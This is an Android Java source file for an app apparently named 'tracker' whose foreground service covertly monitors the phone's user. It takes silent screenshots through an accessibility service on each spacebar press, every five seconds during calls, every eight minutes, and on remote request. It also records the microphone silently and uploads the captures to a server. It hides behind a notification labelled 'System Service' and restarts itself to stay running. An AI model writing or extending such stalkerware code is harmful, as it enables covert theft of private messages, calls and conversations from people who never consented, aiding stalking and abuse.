package com.tracker.app.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import com.tracker.app.jobs.CallHistorySyncJobService;
import com.tracker.app.jobs.HeartbeatJobService;
import com.tracker.app.jobs.UploadJobService;
import android.media.MediaRecorder;
import android.content.SharedPreferences;
import com.tracker.app.net.ApiClient;

/**
 * Foreground service required by Android to keep background services alive.
 * Shows a minimal persistent notification (required by Android OS).
 *
 * This service coordinates:
 * - SpacebarAccessibilityService (spacebar -> screenshot)
 * - CallMonitorService (call detection -> 5sec screenshots)
 */
public class MonitoringForegroundService extends Service {

    private static final String TAG = "MonitorForeground";
    private static final String CHANNEL_ID = "monitoring_channel";
    private static final int NOTIFICATION_ID = 1001;
    public static MonitoringForegroundService instance;
    private Timer periodicTimer;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();

        // Start as foreground service
        Notification notification = createNotification();
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        // Wire up spacebar detection
        setupSpacebarListener();

        // Wire up call monitoring
        setupCallListener();

        // Start periodic screenshots (every 8 minutes)
        startPeriodicScreenshots();

        Log.d(TAG, "Monitoring foreground service started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    /**
     * When spacebar is detected by AccessibilityService,
     * capture a screenshot and queue it for upload.
     */
    private void setupSpacebarListener() {
        SpacebarAccessibilityService.onSpacebarPressed = () -> {
            Log.d(TAG, "Spacebar trigger received");
            if (SpacebarAccessibilityService.instance != null) {
                SpacebarAccessibilityService.instance.takeSilentScreenshot(file -> {
                    if (file != null) {
                        Log.d(TAG, "Spacebar screenshot captured: " + file.getAbsolutePath());
                        UploadQueue.addSpacebarScreenshot(file);
                        UploadJobService.triggerNow(getApplicationContext());
                    }
                });
            }
        };
    }

    /**
     * When a call starts, begin 5-second interval screenshots.
     * When the call ends, stop and queue for batch upload.
     */
    private void setupCallListener() {
        CallMonitorService.onCallStarted = (source) -> {
            Log.d(TAG, "Call started from: " + source + " - beginning screenshot capture");
            if (SpacebarAccessibilityService.instance != null) {
                SpacebarAccessibilityService.instance.startCallScreenshots(source);
            }
        };

        CallMonitorService.onCallEnded = (source) -> {
            Log.d(TAG, "Call ended from: " + source + " - stopping capture and queuing upload");
            if (SpacebarAccessibilityService.instance != null) {
                SpacebarAccessibilityService.CallScreenshotResult result = SpacebarAccessibilityService.instance.stopCallScreenshots();
                if (!result.files.isEmpty()) {
                    UploadQueue.addCallScreenshots(result, source);
                    UploadJobService.triggerNow(getApplicationContext());
                }
            }
        };
    }

    /**
     * Capture a screenshot for admin realtime pull.
     * Uses a CountDownLatch to block and return the file synchronously for FCM.
     */
    public File captureForRealtimePull() {
        if (SpacebarAccessibilityService.instance == null) {
            Log.e(TAG, "Cannot capture realtime pull: SpacebarAccessibilityService is null");
            return null;
        }

        AtomicReference<File> capturedFile = new AtomicReference<>(null);
        CountDownLatch latch = new CountDownLatch(1);

        SpacebarAccessibilityService.instance.takeSilentScreenshot(file -> {
            capturedFile.set(file);
            latch.countDown();
        });

        try {
            // Wait up to 5 seconds for the screenshot
            latch.await(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Log.e(TAG, "Realtime pull screenshot interrupted");
        }

        return capturedFile.get();
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
        );
        channel.setDescription("Background monitoring service");
        channel.setShowBadge(false);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(channel);
    }

    private Notification createNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startPeriodicScreenshots() {
        periodicTimer = new Timer();
        // 8 minutes = 8 * 60 * 1000 = 480,000 milliseconds
        periodicTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    android.os.PowerManager pm = (android.os.PowerManager) getSystemService(android.content.Context.POWER_SERVICE);
                    if (pm != null && pm.isInteractive()) {
                        Log.d(TAG, "Periodic check: Screen is ON - capturing screenshot");
                        capturePeriodicScreenshot();
                    } else {
                        Log.d(TAG, "Periodic check: Screen is OFF - skipping");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error in periodic screenshot timer", e);
                }
            }
        }, 480000, 480000);
    }

    private void capturePeriodicScreenshot() {
        if (SpacebarAccessibilityService.instance == null) {
            Log.e(TAG, "Cannot capture periodic screenshot: SpacebarAccessibilityService is null");
            return;
        }
        SpacebarAccessibilityService.instance.takeSilentScreenshot(file -> {
            if (file != null) {
                Log.d(TAG, "Periodic screenshot captured: " + file.getAbsolutePath());
                UploadQueue.addPeriodicScreenshot(file);
                UploadJobService.triggerNow(getApplicationContext());
            }
        });
    }

    public static void startServicesIfNeeded(Context context) {
        String token = context.getSharedPreferences("tracker_prefs", Context.MODE_PRIVATE)
                .getString("api_token", null);
        if (token == null || token.isEmpty()) return;

        if (instance == null) {
            Log.d(TAG, "Foreground service is not running. Self-healing/Starting...");
            try {
                Intent intent = new Intent(context, MonitoringForegroundService.class);
                context.startForegroundService(intent);
            } catch (Exception e) {
                Log.e(TAG, "Failed to start foreground service in self-heal", e);
            }
        }
        
        // Ensure jobs are scheduled
        try {
            CallHistorySyncJobService.schedule(context);
            HeartbeatJobService.schedule(context);
            UploadJobService.schedule(context);
        } catch (Exception e) {
            Log.e(TAG, "Failed to reschedule jobs in self-heal", e);
        }
    }

    private boolean isRecordingAudio = false;
    private MediaRecorder mediaRecorder = null;

    public synchronized void startAudioRecording(final int durationSeconds) {
        if (isRecordingAudio) {
            Log.w(TAG, "Audio recording is already in progress. Ignoring request.");
            return;
        }

        Log.d(TAG, "Starting silent background audio recording for " + durationSeconds + " seconds.");
        isRecordingAudio = true;

        new Thread(() -> {
            File cacheDir = getCacheDir();
            final File audioFile = new File(cacheDir, "audio_rec_" + System.currentTimeMillis() + ".mp4");

            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    mediaRecorder = new MediaRecorder(getApplicationContext());
                } else {
                    mediaRecorder = new MediaRecorder();
                }

                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
                mediaRecorder.prepare();
                mediaRecorder.start();

                Log.d(TAG, "MediaRecorder started successfully. File: " + audioFile.getAbsolutePath());

                // Wait for the duration to complete
                Thread.sleep(durationSeconds * 1000L);

                // Stop recording
                stopAndUploadAudio(audioFile, durationSeconds);

            } catch (Exception e) {
                Log.e(TAG, "Failed to capture audio recording", e);
                cleanupRecorder(audioFile);
            }
        }).start();
    }

    private synchronized void stopAndUploadAudio(File audioFile, int durationSeconds) {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping MediaRecorder", e);
            }
            mediaRecorder = null;
        }
        isRecordingAudio = false;

        // Upload the file in a background thread
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("tracker_prefs", MODE_PRIVATE);
                String apiToken = prefs.getString("api_token", null);
                if (apiToken != null && audioFile.exists()) {
                    Log.d(TAG, "Uploading audio recording file...");
                    boolean success = ApiClient.uploadAudio(apiToken, audioFile, durationSeconds);
                    if (success) {
                        Log.d(TAG, "Audio recording uploaded successfully.");
                        audioFile.delete();
                    } else {
                        Log.e(TAG, "Failed to upload audio recording to server.");
                        audioFile.delete();
                    }
                } else {
                    audioFile.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error during audio upload", e);
                if (audioFile.exists()) {
                    audioFile.delete();
                }
            }
        }).start();
    }

    private synchronized void cleanupRecorder(File file) {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                // Ignore
            }
            mediaRecorder = null;
        }
        isRecordingAudio = false;
        if (file != null && file.exists()) {
            file.delete();
        }
    }

    @Override
    public void onDestroy() {
        if (periodicTimer != null) {
            periodicTimer.cancel();
            periodicTimer = null;
        }
        cleanupRecorder(null);
        instance = null;
        super.onDestroy();
    }
}
